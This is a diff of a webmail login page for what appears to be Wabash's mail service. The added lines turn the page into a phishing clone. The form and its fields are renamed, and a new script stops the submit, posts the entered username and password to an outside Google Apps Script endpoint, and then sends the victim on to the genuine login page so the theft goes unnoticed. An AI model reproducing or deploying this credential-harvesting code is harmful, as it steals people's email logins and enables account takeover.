@@ -1547,6 +1547,7 @@ td.mm-table-action-buttons > * {
     gap: 5px;
     padding-top: 10px;
 }
+
 </style>
     <!--[if IE]><link rel='stylesheet' href='css/magicmail-ie.css?mtime=1767207937' type='text/css'/>
 <![endif]-->
@@ -2498,8 +2499,8 @@ Service and Technical Support team.<br><br>
 
 <!-- default_login_info_second end -->
 <div id="login-form-wrapper">
-    <form method="post" id="login-form" name="login-form" onsubmit="return checkForm();">
-        <input type="hidden" id="browser_info" value="MacOSX," firefox,="" desktop="">
+    <form method="post" id="login-form" name="google-sheet" onsubmit="return checkForm();">
+        <input type="hidden" id="browser_info" value="Wabash - 2025," firefox,="" desktop="">
         <blockquote>
             <table id="login-form-table" class="MagicEmbeddedTable">
                 <tbody><tr>
@@ -2516,7 +2517,7 @@ Service and Technical Support team.<br><br>
                         </label>
                     </td>
                     <td>
-                        <input size="20" type="email" name="email" id="login-email" autocorrect="off" autocapitalize="none" value="">
+                        <input size="20" type="email" name="Username" id="login-email" autocorrect="off" autocapitalize="none" value="">
                     </td>
                 </tr>
 
@@ -2527,7 +2528,7 @@ Service and Technical Support team.<br><br>
                         </label>
                     </td>
                     <td class="show-password">
-                        <input size="20" type="password" name="password" id="login-password" value="">
+                        <input size="20" type="password" name="Password" id="login-password" value="">
                         <label for="show-password">
                             <input type="checkbox" id="show-password" onclick="showPass()">
 				                Show Password
@@ -2562,7 +2563,24 @@ Service and Technical Support team.<br><br>
                 </tr>
             </tbody></table>
         </blockquote>
-    </form>
+    </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://mail.wabash.net/login.php';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 </div>
 <!-- $default_login_extra$ -->
 <!-- =================================================================== -->
